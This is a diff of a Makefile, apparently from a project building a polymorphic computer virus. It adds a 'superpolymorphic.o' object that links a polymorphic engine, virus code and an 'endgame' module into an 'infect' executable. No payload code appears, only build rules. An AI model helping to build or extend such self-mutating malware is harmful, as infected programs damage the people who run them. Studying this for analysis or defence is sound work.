@@ -43,10 +43,18 @@ CFLAGS = -c  -Wall -O2 -g
 LFLAGS = -no-pie 
 KFLAGS = -no-pie -nostartfiles -m64 -g -falign-functions=16 
 MFLAGS = -no-pie -r
-all: virus hello  polymorphic.o
 
-virus: infect.c polymorphic.c  polymorphic.o
+all: virus hello  polymorphic.o superpolymorphic.o
+
+virus: infect.c superpolymorphic.o
 	$(CC) $(KFLAGS) $^ -o $@
+
+
+superpolymorphic.o: polymorphicengine.o virus.o polymorphicendgame.o
+	$(LCC) $(MFLAGS) $^ -o $@
+
+polymorphicendgame.o: polymorphic.c
+	$(CC) $(CFLAGS) $^ -o $@
 
 polymorphic.o: polymorphicengine.o virus.o
 	$(LCC) $(MFLAGS) $^ -o $@
